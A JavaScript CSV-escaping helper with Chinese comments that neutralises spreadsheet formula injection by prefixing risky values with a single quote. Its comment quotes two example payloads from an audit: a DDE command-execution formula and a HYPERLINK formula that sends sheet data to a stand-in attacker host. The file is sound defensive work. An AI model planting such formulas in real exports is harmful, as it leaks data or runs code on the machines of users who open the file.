/**
 * CSV 单元格转义：含逗号/引号/换行时必须包起来，内部引号翻倍。
 * 从 server.mjs 抽出 —— auditCsv 与 server 共用同一份，不许两份实现漂移。
 *
 * ── 公式注入中和（2026-10-20 审计 P1-2，CWE-1236）──
 *   RFC4180 的引号转义**不阻止**表格软件把 `=cmd|'/c calc'!A0` 当公式执行。
 *   攻击链：设计师把柜体命名为 `=HYPERLINK("http://attacker/?"&A1,"报价")`
 *   → 名称进板件 nameZh → POST /api/export/cutlist → 车间/财务在 Excel 打开。
 *   即使不执行 DDE，外链公式也足以静默外带同表数据。
 *
 *   中和办法：以 `= + - @` 或制表符/回车开头的值，前置一个单引号 `'`。
 *   单引号在 Excel / WPS / LibreOffice 里都表示"这是文本，别当公式算"，
 *   并且不会被显示出来。代价是原始数据里若真有以这些字符开头的文本，
 *   导出后文件内容是 `'=abc`（多一个前缀）—— 这是业界通行取舍（OWASP 推荐）。
 */

/** 需要中和的公式起始字符（OWASP CSV Injection 清单）。 */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

export function csvCell(v) {
  const s = String(v ?? '');
  // 先中和公式，再做 RFC4180 转义 —— 顺序不能反：前缀必须在引号内生效。
  const safe = FORMULA_PREFIX.test(s) ? `'${s}` : s;
  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
